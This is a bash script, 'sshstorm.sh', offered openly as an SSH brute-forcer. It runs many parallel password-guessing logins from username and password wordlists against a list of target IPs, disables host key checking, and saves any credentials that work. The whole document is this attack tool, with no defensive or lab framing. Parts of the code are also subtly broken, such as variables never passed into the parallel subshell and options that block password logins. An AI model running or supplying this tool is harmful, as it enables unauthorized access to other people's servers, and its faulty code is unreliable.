#!/bin/bash

# - iNFO ---------------------------------------
#
#   Author: wuseman <wuseman@nr1.nu>
# FileName: sshstorm.sh
#  Version: v1.0
#
#  Created: 2023-06-10
# Modified:
#
#      iRC: wuseman (Libera/EFnet)
#   GitHub: https://github.com/wuseman/
#  Website: https://www.nr1.nu
#
# - End of Header ------------------------------

# Default values
ip_list="iplist.txt"
port=22
user_list="usernames.txt"
pass_list="wordlist.txt"
threads=100
timeout_duration=5
successful_logins="successful_logins.txt"

# Function to display script usage
usage() {
    echo "Usage: bash sshstorm.sh [OPTIONS]"
    echo "SSH Scanner and Bruteforcer"
    echo ""
    echo "Options:"
    echo "  -i, --iplist FILE      Specify the IP list file (Default: iplist.txt)"
    echo "  -p, --port PORT        Specify the SSH port (Default: 22)"
    echo "  -u, --users FILE       Specify the usernames list file (Default: usernames.txt)"
    echo "  -w, --wordlist FILE    Specify the password wordlist file (Default: wordlist.txt)"
    echo "  -t, --threads NUM      Specify the number of threads to use (Default: 100)"
    echo "  -x, --timeout SECONDS  Specify the timeout duration for each SSH attempt (Default: 5)"
    echo "  -h, --help             Display this help message"
}

# Function to validate integer input
validate_integer_input() {
    local input=$1
    if ! [[ $input =~ ^[0-9]+$ ]]; then
        echo "Error: Invalid input. Must be a positive integer."
        exit 1
    fi
}

# Function to validate port input
validate_port_input() {
    local input=$1
    if ! [[ $input =~ ^[0-9]+$ ]]; then
        echo "Error: Invalid port number. Must be a positive integer."
        exit 1
    fi
    if ((input < 1 || input > 65535)); then
        echo "Error: Invalid port number. Must be between 1 and 65535."
        exit 1
    fi
}

# Function to check if a file exists
check_file_exists() {
    local file=$1
    if [[ ! -f $file ]]; then
        echo "Error: File not found: $file"
        exit 1
    fi
}

# Function to check dependencies
check_dependencies() {
    local missing_dependencies=()

    if ! command -v nc >/dev/null 2>&1; then
        missing_dependencies+=("nc")
    fi

    if ! command -v sshpass >/dev/null 2>&1; then
        missing_dependencies+=("sshpass")
    fi

    if [[ ${#missing_dependencies[@]} -gt 0 ]]; then
        echo "Error: Missing dependencies: ${missing_dependencies[*]}"
        exit 1
    fi
}

# Function to perform SSH brute force attack
bruteforcer() {
    local count=0

    banner
    check_dependencies
    check_file_exists "$user_list"
    check_file_exists "$pass_list"

    echo "[*] SSH Bruteforcer"
    echo "    Usernames list: $user_list"
    echo "    Passwords list: $pass_list"
    echo "    SSH port: $port"
    echo "    Timeout duration: $timeout_duration seconds"

    read -rp $'\e[1;92m[?] Start Brute Forcer?\e[0m\e[1;77m [Y/n]\e[0m ' brute

    if [[ "$brute" == "n" || "$brute" == "N" ]]; then
        exit 0
    fi

    # Create a temporary directory for each thread
    local temp_dir
    temp_dir=$(mktemp -d)

    # Set the successful logins file path
    local successful_logins_file="$temp_dir/$successful_logins"

    # Use xargs for multithreading
    xargs -I {} -P "$threads" bash -c '
        target="$1"
        while IFS= read -r user; do
            while IFS= read -r password; do
                ((count++))
                printf "\r[*] Progress: %d" "$count"

sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout="$timeout_duration" "$user"@"$target" -p "$port" true >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "[*] Successful login: $target, $user, $password" | tee -a "$successful_logins_file"
fi
            done <"$pass_list"
        done <"$user_list"
    ' _ {} <"$ip_list"

    # Concatenate all successful logins into a single file
    cat "$temp_dir"/* >>"$successful_logins_file"

    # Display the successful logins
    if [[ -s "$successful_logins_file" ]]; then
        echo ""
        echo "[+] Found valid credentials:"
        cat "$successful_logins_file"
    else
        echo ""
        echo "[!] Brute force attack completed. No valid credentials found."
    fi

    # Clean up temporary directory
    rm -rf "$temp_dir"
}

# Display tool banner
banner() {
    echo "=========================================="
    echo "           SSHStorm"
    echo "=========================================="
    echo ""
}

# Main script logic
if [[ $# -eq 0 ]]; then
    echo "Error: Missing option. Use -h or --help to see usage."
    exit 1
fi

# Parse command line options
while [[ $# -gt 0 ]]; do
    case $1 in
    -i | --iplist)
        ip_list=$2
        check_file_exists "$ip_list"
        shift
        ;;
    -p | --port)
        port=$2
        validate_port_input "$port"
        shift
        ;;
    -u | --users)
        user_list=$2
        shift
        ;;
    -w | --wordlist)
        pass_list=$2
        shift
        ;;
    -t | --threads)
        threads=$2
        validate_integer_input "$threads"
        shift
        ;;
    -x | --timeout)
        timeout_duration=$2
        validate_integer_input "$timeout_duration"
        shift
        ;;
    -h | --help)
        usage
        exit 0
        ;;
    *)
        echo "Invalid option: $1"
        usage
        exit 1
        ;;
    esac
    shift
done

# Perform SSH brute force attack
bruteforcer

exit 0
